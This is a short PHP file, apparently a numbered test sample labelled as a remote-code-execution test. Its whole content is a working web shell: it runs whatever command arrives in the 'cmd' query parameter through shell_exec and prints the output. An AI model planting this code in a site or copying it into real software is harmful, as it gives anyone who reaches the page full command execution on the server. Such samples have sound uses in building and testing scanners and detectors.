<?php
// RCE test variation #1181
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>